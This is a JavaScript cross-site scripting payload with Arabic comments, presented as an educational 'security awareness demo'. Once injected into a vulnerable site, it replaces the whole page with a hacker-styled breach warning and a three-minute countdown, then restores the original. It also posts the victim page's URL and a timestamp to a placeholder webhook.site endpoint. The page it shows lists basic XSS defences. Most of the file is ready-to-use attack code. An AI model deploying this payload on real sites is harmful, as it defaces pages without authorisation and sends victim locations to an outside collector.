(function() {
    // منع التنفيذ المتكرر
    if (window.xssAttackExecuted) return;
    window.xssAttackExecuted = true;
    
    // حفظ المحتوى الأصلي للصفحة
    const originalBody = document.body.innerHTML;
    const originalTitle = document.title;
    const originalStyle = document.body.getAttribute('style');
    
    console.log('[XSS] Starting 3-minute attack...');
    
    // الصفحة الجديدة مع تصميم هاكر
    const attackPage = `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>⚠️ ثغرة أمنية - XSS Vulnerability</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap');
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Cairo', 'Courier New', monospace;
            }
            body {
                background: #000;
                color: #0f0;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                flex-direction: column;
                padding: 20px;
                text-align: center;
                overflow: hidden;
                position: relative;
            }
            .matrix-bg {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                opacity: 0.1;
                z-index: -1;
                pointer-events: none;
            }
            .container {
                max-width: 800px;
                background: rgba(0, 20, 0, 0.8);
                border: 2px solid #0f0;
                border-radius: 15px;
                padding: 40px;
                box-shadow: 0 0 30px #0f0;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { box-shadow: 0 0 20px #0f0; }
                50% { box-shadow: 0 0 40px #0f0; }
                100% { box-shadow: 0 0 20px #0f0; }
            }
            h1 {
                font-size: 3rem;
                color: #ff0000;
                text-shadow: 0 0 10px #ff0000;
                margin-bottom: 20px;
                border-bottom: 3px solid #0f0;
                padding-bottom: 15px;
            }
            .warning-icon {
                font-size: 4rem;
                margin-bottom: 20px;
                animation: blink 1s infinite;
            }
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.3; }
            }
            .message {
                font-size: 1.2rem;
                line-height: 1.8;
                margin-bottom: 30px;
                color: #fff;
            }
            .details {
                background: rgba(255, 0, 0, 0.1);
                border-left: 4px solid #ff0000;
                padding: 15px;
                margin: 20px 0;
                text-align: right;
                font-size: 0.9rem;
            }
            .timer {
                font-size: 2rem;
                color: #00ff00;
                margin: 20px 0;
                font-family: 'Courier New', monospace;
            }
            .info-box {
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid #0f0;
                padding: 15px;
                margin: 20px 0;
                border-radius: 8px;
            }
            .button {
                background: linear-gradient(45deg, #ff0000, #ff8800);
                color: white;
                border: none;
                padding: 15px 40px;
                font-size: 1.2rem;
                border-radius: 8px;
                cursor: pointer;
                margin: 10px;
                transition: all 0.3s;
                font-weight: bold;
            }
            .button:hover {
                background: linear-gradient(45deg, #ff8800, #ff0000);
                transform: scale(1.05);
                box-shadow: 0 0 20px #ff0000;
            }
            .footer {
                margin-top: 30px;
                font-size: 0.8rem;
                color: #888;
            }
            .countdown {
                font-size: 3rem;
                font-weight: bold;
                color: #ff0000;
                margin: 20px 0;
            }
            .hacker-text {
                font-family: 'Courier New', monospace;
                background: #111;
                padding: 10px;
                border-radius: 5px;
                margin: 10px 0;
                text-align: left;
                direction: ltr;
            }
        </style>
    </head>
    <body>
        <div class="matrix-bg" id="matrix"></div>
        
        <div class="container">
            <div class="warning-icon">⚠️</div>
            <h1>إنذار أمني عاجل</h1>
            <h2>SECURITY BREACH DETECTED</h2>
            
            <div class="timer">
                ⏳ الصفحة ستعود خلال: <span id="countdown">03:00</span>
            </div>
            
            <div class="message">
                <p><strong>🔓 تم اكتشاف ثغرة XSS خطيرة في هذا الموقع</strong></p>
                <p>هذا النموذج التوضيحي يظهر كيف يمكن لمهاجم التحكم الكامل بصفحتك</p>
            </div>
            
            <div class="details">
                <p>📌 <strong>تفاصيل الثغرة:</strong></p>
                <p>• نوع الهجوم: Cross-Site Scripting (XSS)</p>
                <p>• الموقع: ${window.location.hostname}</p>
                <p>• المصدر: GitHub Raw File</p>
                <p>• الوقت: ${new Date().toLocaleString('ar-SA')}</p>
            </div>
            
            <div class="info-box">
                <p>💡 <strong>معلومات للمطورين:</strong></p>
                <p>1. تأكد من تصفية مدخلات المستخدم (Input Sanitization)</p>
                <p>2. استخدم Content Security Policy (CSP)</p>
                <p>3. فعّل HttpOnly و Secure flags للكوكيز</p>
                <p>4. استخدم أطراف عمل (Frameworks) آمنة مثل React, Angular, Vue</p>
            </div>
            
            <div class="hacker-text">
                <p>> [SYSTEM] XSS Payload Executed Successfully</p>
                <p>> [INFO] Page Content Replaced</p>
                <p>> [WARNING] Security Vulnerability Detected</p>
                <p>> [TIMER] Auto-restore in: <span id="hacker-timer">180</span>s</p>
            </div>
            
            <div>
                <button class="button" onclick="restorePage()">🔄 إعادة تحميل الموقع الآن</button>
                <button class="button" onclick="showDetails()">📊 عرض معلومات إضافية</button>
            </div>
            
            <div class="footer">
                <p>هذا عرض توضيحي لأغراض التعليم والاختبار الأمني فقط</p>
                <p>© ${new Date().getFullYear()} - Security Awareness Demo</p>
            </div>
        </div>
        
        <script>
            // إنشاء خلفية المصفوفة (Matrix effect)
            function createMatrixEffect() {
                const canvas = document.createElement('canvas');
                canvas.classList.add('matrix-bg');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                document.getElementById('matrix').appendChild(canvas);
                
                const ctx = canvas.getContext('2d');
                const chars = "01アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン";
                const charArray = chars.split("");
                const drops = [];
                const fontSize = 14;
                const columns = canvas.width / fontSize;
                
                for(let i = 0; i < columns; i++) {
                    drops[i] = 1;
                }
                
                function draw() {
                    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    ctx.fillStyle = '#0F0';
                    ctx.font = fontSize + 'px monospace';
                    
                    for(let i = 0; i < drops.length; i++) {
                        const text = charArray[Math.floor(Math.random() * charArray.length)];
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                        
                        if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                            drops[i] = 0;
                        }
                        drops[i]++;
                    }
                }
                
                setInterval(draw, 33);
            }
            
            // العد التنازلي
            let timeLeft = 180; // 3 دقائق بالثواني
            const countdownElement = document.getElementById('countdown');
            const hackerTimerElement = document.getElementById('hacker-timer');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = \`\${minutes.toString().padStart(2, '0')}:\${seconds.toString().padStart(2, '0')}\`;
                hackerTimerElement.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    restorePage();
                } else {
                    timeLeft--;
                }
            }
            
            // استعادة الصفحة الأصلية
            function restorePage() {
                if (window.originalPageContent) {
                    document.body.innerHTML = window.originalPageContent.body;
                    document.title = window.originalPageContent.title;
                    document.body.setAttribute('style', window.originalPageContent.style || '');
                    console.log('[XSS] Page restored successfully');
                    
                    // إعادة تحميل لطيفة
                    setTimeout(() => {
                        location.reload();
                    }, 1000);
                } else {
                    location.reload();
                }
            }
            
            // عرض معلومات إضافية
            function showDetails() {
                alert(\`🔍 معلومات النظام:
                • الموقع: \${window.location.href}
                • User Agent: \${navigator.userAgent}
                • Cookies: \${document.cookie ? 'Present' : 'None'}
                • Page loaded: \${new Date().toLocaleString()}
                • XSS Payload executed from external source
                \`);
            }
            
            // حفظ محتوى الصفحة الأصلي في كائن عام
            window.originalPageContent = {
                body: \`${originalBody.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`,
                title: '${originalTitle.replace(/'/g, "\\'")}',
                style: '${originalStyle ? originalStyle.replace(/'/g, "\\'") : ''}'
            };
            
            // بدء المؤثرات
            setTimeout(createMatrixEffect, 100);
            setInterval(updateTimer, 1000);
            
            // بدء العد التنازلي تلقائياً
            updateTimer();
        </script>
    </body>
    </html>
    `;
    
    // حفظ الصفحة الحالية (اختياري)
    window.originalDocument = document.documentElement.innerHTML;
    
    // تغيير الصفحة كاملة
    document.documentElement.innerHTML = attackPage;
    
    // إضافة event listener لحفظ عند إغلاق
    window.addEventListener('beforeunload', function() {
        localStorage.setItem('xss_attack_active', 'true');
    });
    
    // تحذير في الconsole
    console.warn('===================================');
    console.warn('⚠️ XSS ATTACK DEMO ACTIVATED');
    console.warn(`⏰ Page will restore in 3 minutes`);
    console.warn('📌 This is for security testing only');
    console.warn('===================================');
    
    // إرسال تنبيه للسيرفر (اختياري)
    try {
        fetch('https://webhook.site/YOUR-TOKEN', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                type: 'xss_demo_activated',
                url: window.location.href,
                time: new Date().toISOString()
            })
        });
    } catch(e) {}
})();